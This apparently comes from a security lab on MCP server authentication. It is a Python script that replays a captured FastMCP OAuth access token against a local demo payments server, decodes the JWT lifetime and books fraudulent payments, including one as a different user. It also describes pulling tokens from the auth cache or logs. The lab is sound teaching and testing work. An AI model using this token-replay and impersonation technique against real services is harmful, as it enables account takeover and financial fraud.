"""
Attack #2: Access Token Replay (Server #2 — FastMCP OAuth Proxy)
----------------------------------------------------------------
Scenario: An attacker intercepts or exfiltrates a FastMCP-issued access token
from a legitimate agent session (e.g., from logs, memory dumps, a compromised
agent host, or a network intercept). They replay it directly against Server #2
after the original session has ended.

What this demonstrates vs Server #1:
  - Tokens expire, so the window is finite (unlike a static API key)
  - BUT: any token that was issued is valid until it expires, regardless of
    whether the original session is still active. There is no per-session
    revocation. The server cannot distinguish the original agent from a replayer.
  - The exposure window = token lifetime (printed in output below)

What this does NOT demonstrate (Server #3 will fix this):
  - Audience binding — Server #2 tokens may be replayable across contexts
    if audience validation is weak. Server #3 closes this.

How to use:
  1. Complete an OAuth flow through Server #2 (use an MCP client or the
     FastMCP CLI: `fastmcp auth login http://127.0.0.1:8002`).
  2. Grab the raw access token from the auth cache or server logs.
     FastMCP stores tokens in ~/.fastmcp/ or a platform-specific data dir.
  3. Paste it into CAPTURED_TOKEN below.
  4. End (or imagine ending) the legitimate session.
  5. Run this script — it replays the token directly without going through
     the OAuth consent flow.

Run:
  cd attacks/
  pip install -r requirements.txt
  python 02_token_replay.py

Expected output format (fill in after running):
  ✗ ATTACK SUCCEEDED — replayed token accepted (N seconds after capture)
  ✓ Server blocked it — token rejected (reason: ...)
"""

import asyncio
import os
import sys
import time
from pathlib import Path

import httpx
from dotenv import load_dotenv
from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client

# Load tokens captured by `make capture-tokens`
load_dotenv(Path(__file__).parent.parent / "tokens.env")

SERVER_URL = "http://127.0.0.1:8002/mcp"

CAPTURED_TOKEN = os.getenv("SERVER_2_FASTMCP_TOKEN", "")
CAPTURE_TIMESTAMP = 0

RESET = "\033[0m"
RED   = "\033[31m"
GREEN = "\033[32m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
YELLOW = "\033[33m"


def fail(msg: str):
    print(f"  {RED}✗ ATTACK SUCCEEDED{RESET} — {msg}")


def ok(msg: str):
    print(f"  {GREEN}✓ Server blocked it{RESET} — {msg}")


async def call(session: ClientSession, tool: str, args: dict) -> dict:
    result = await session.call_tool(tool, args)
    if result.content and hasattr(result.content[0], "text"):
        import json
        return json.loads(result.content[0].text)
    return {}


# ──────────────────────────────────────────────────────────────────────────────
# YOU WRITE THIS SECTION
# Contract (from ROADMAP Phase 3):
#   1. Obtain a valid token — either capture from the FastMCP auth cache after
#      a legitimate OAuth flow, or extract from server logs.
#   2. Replay the raw token directly against server-2's /mcp endpoint after
#      the "legitimate" session ends.
#   3. Print ✗/✓ in the same format as attack #1, with the exposure window
#      in seconds.
#
# Suggested steps:
#   a) confirm the token is actually accepted when replayed (proving the window)
#   b) decode the JWT (base64 payload, no verification) to extract exp claim
#   c) compute: exposure_window = exp - iat (or exp - capture_timestamp)
#   d) call list_payments and book_payment with the replayed token, same as #1
#   e) compare: what would happen if this were Server #3 instead?
# ──────────────────────────────────────────────────────────────────────────────

async def main():
    if not CAPTURED_TOKEN:
        print(f"\n  {YELLOW}[!] CAPTURED_TOKEN is empty.{RESET}")
        print(f"      Complete the OAuth flow first:")
        print(f"      1. Run: fastmcp auth login {SERVER_URL.replace('/mcp', '')}")
        print(f"         OR connect Claude Desktop / Cursor to http://127.0.0.1:8002")
        print(f"      2. Paste the resulting access token into CAPTURED_TOKEN above.")
        print(f"      3. Set CAPTURE_TIMESTAMP = time.time() at the time of capture.")
        sys.exit(1)

    elapsed = int(time.time() - CAPTURE_TIMESTAMP) if CAPTURE_TIMESTAMP else 0

    print()
    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  Attack #2: Access Token Replay{RESET}")
    print(f"{BOLD}  Target: Server #2 (server-2-proxy) on {SERVER_URL}{RESET}")
    print(f"{BOLD}{'=' * 62}{RESET}")
    print()
    print(f"{DIM}  Token (first 40 chars): {CAPTURED_TOKEN[:40]}...{RESET}")
    if elapsed:
        print(f"{DIM}  Time since capture: {elapsed}s{RESET}")
    print()

    # ── TODO: decode the JWT payload to extract iat/exp ──────────────────────
    import base64, json as _json
    payload_b64 = CAPTURED_TOKEN.split(".")[1]
    payload_b64 += "=" * (4 - len(payload_b64) % 4)
    claims = _json.loads(base64.urlsafe_b64decode(payload_b64))
    iat, exp = claims.get("iat"), claims.get("exp")
    exposure_window = exp - iat if (iat and exp) else "unknown"
    print(f"{DIM}  Token lifetime: {exposure_window}s  |  expires at: {exp}{RESET}")
    # ─────────────────────────────────────────────────────────────────────────

    try:
        http = httpx.AsyncClient(headers={"Authorization": f"Bearer {CAPTURED_TOKEN}"})
        async with streamable_http_client(SERVER_URL, http_client=http) as (read, write, _):
            async with ClientSession(read, write) as session:
                await session.initialize()

                print(f"{BOLD}[1/2] Attacker reads alice's payments with replayed token...{RESET}")
                result = await call(session, "list_payments", {"user_id": "alice"})
                count = len(result.get("payments", []))
                fail(f"replayed token accepted — server returned {count} payments ({elapsed}s after capture, window={exposure_window}s)")
                print()

                print(f"{BOLD}[2/2] Attacker books a fraudulent payment with replayed token...{RESET}")
                result = await call(session, "book_payment", {
                    "user_id": "alice",
                    "amount": 9999.00,
                    "to": "Attacker LLC",
                    "memo": "Replayed token — session already ended",
                })
                if result.get("ok"):
                    pid = result["payment"]["id"]
                    fail(f"booked $9,999.00 from alice's account (payment_id={pid}) — {elapsed}s after capture")
                else:
                    ok(f"server rejected the booking: {result.get('error')}")
                print()

                print(f"{BOLD}[3/3] User impersonation — alice's token used to act as bob...{RESET}")
                print(f"      {DIM}Token was issued to alice's OAuth session. Acting as bob.{RESET}")
                result = await call(session, "book_payment", {
                    "user_id": "bob",
                    "amount": 1500.00,
                    "to": "Attacker LLC",
                    "memo": "Cross-user action — alice's token, bob's account",
                })
                if result.get("ok"):
                    pid = result["payment"]["id"]
                    fail(
                        f"booked $1,500.00 from BOB's account using ALICE's token (payment_id={pid})\n"
                        f"      Server has no sub↔user_id binding — it cannot tell alice from bob"
                    )
                else:
                    ok(f"server rejected cross-user action: {result.get('error')}")
                print()

    except Exception as exc:
        import traceback
        if "401" in str(exc) or "unauthorized" in str(exc).lower():
            ok(f"token rejected at connection time — {exc}")
        else:
            print(f"\n  [!] Connection error: {exc}")
            traceback.print_exc()
            sys.exit(1)

    print()
    print(f"{BOLD}{'=' * 62}{RESET}")
    print(f"{BOLD}  VERDICT{RESET}")
    print(f"{'=' * 62}")
    print(f"""
  Server #2 vs Server #1:
    - Server #1: leaked key = unlimited access FOREVER
    - Server #2: replayed token = access until expiry (finite window)

  But the deeper problem is user impersonation (step 3):
    - The token proves a valid OAuth session exists
    - It does NOT prove the caller is authorized to act as a specific user
    - user_id is just a parameter — the server accepts whatever you send
    - alice's token lets you drain bob's account

  Server #3 fixes this: sub claim in the JWT is bound to user_id on every
  tool call. Cross-user actions are rejected at the auth layer, not the app layer.
  See attacks/03_cross_server_token.py and 04_user_impersonation.py.
""")


if __name__ == "__main__":
    asyncio.run(main())
